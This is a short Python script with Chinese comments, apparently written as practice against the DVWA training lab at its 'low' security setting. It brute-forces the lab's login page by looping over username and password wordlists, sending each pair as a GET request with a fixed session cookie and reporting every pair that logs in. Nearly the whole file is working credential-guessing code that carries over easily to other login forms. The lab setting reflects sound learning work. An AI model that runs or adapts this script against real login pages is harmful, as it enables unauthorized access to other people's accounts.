'''
    尝试编写dvwa靶场登录暴力破解功能开发
    security:low
'''
# 导入模块
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36'
}

cookie = {
    "PHPSESSID": "u2t131j6smuvdkhnmvvhs9oaia",
    "security": "low"
}

login_data = {
    "username": "admin",
    "password": "",
    "Login": "Login"
}

# 登录函数
def login(host: str, cookies: dict, datas: dict):
        # 登录响应包
        response = requests.get(
            url="http://%s/vulnerabilities/brute" % host,
            params=datas,
            headers=headers,
            cookies=cookies
        )

        if "Welcome to the password protected area" in response.content.decode(encoding='utf-8'):
            print("access success!\n username:%s\n password:%s" % (datas['username'], datas['password']))
            return True
        elif "Username and/or password incorrect." in response.content.decode(encoding='utf-8'):
            return False
        else:
            raise Exception("login status error")




# 读取字典
def read_dict(dict_path: str):
    elements = []
    try:
        with open(dict_path, "r") as f:
            for element in f:
                elements.append(element.strip())
    except FileNotFoundError:
        print("字典不存在")
    return elements

# 单线程暴力破解
def single_thread_brute(host: str, usernames: list, passwords: list):
    # 存储已破解的用户名
    cracked_user = []
    for user in usernames:
        print("正在尝试用户名:%s......" % user)
        for password in passwords:
            login_data['username'] = user
            login_data['password'] = password
            if login(host, cookie, login_data):
                cracked_user.append({login_data['username']: login_data['password']})
                break
    return cracked_user

if __name__ == '__main__':
    # 读取密码字典
    password_list = read_dict("pass_dict.txt")
    # 读取用户名字典
    user_list = read_dict("user_dict.txt")

    cracked_user = single_thread_brute("dvwa.com", user_list, password_list)

    print(cracked_user)


